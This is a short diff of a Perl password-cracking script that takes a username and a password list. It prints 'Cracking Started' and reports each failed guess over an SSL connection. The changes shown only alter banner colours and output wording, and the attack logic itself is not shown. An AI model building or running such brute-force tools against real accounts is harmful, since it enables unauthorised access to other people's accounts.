@@ -29,13 +29,13 @@ print "\033[0;33m|:~# Contact : t.me/Fsec7                    |\n";
 print "\033[0;32m|:~# Usage   : perl han.pl username pass.txt |\n";
 print "\033[0;32m+============================================+\n";
 print "\n";
-print "\033[0;34m    +~#~#~#~#~#~#~#~#~#~#~#~#~#~#~#~#~#~#~#~#~+\n";
+print "\033[0;33m    +~#~#~#~#~#~#~#~#~#~#~#~#~#~#~#~#~#~#~#~#~+\n";
 print "\033[0;31m    #    Info : https://www.fsecurity7.com    #\n";
 print "\033[0;31m    +                                         +\n";
 print "\033[0;31m    #          Simple Life Hack ^_^           #\n";
-print "\033[0;34m    +~#~#~#~#~#~#~#~#~#~#~#~#~#~#~#~#~#~#~#~#~+\033[0m\n";
+print "\033[0;33m    +~#~#~#~#~#~#~#~#~#~#~#~#~#~#~#~#~#~#~#~#~+\033[0m\n";
 
-print "\033[0;34m\n [+] Cracking Started on: $user ...\n\n";
+print "\033[0;36m\n [+] Cracking Started on: $user ...\n\n";
 print "===============================================\n";
 
 while (my $password = <LIST>) {
@@ -89,7 +89,7 @@ $success = $1;
 }
 if (!defined $success)
 {
-print "\033[1;32m[-] $password\033[1;36m\n~/~/~/~#>> \033[1;31mFalse\033[0m \n";
+print "\033[1;32m[checking] >> $password\033[1;36m\n=|~|~|~#>> \033[1;31mFalse\033[0m \n";
 print "\n";
 close SSL;
 }
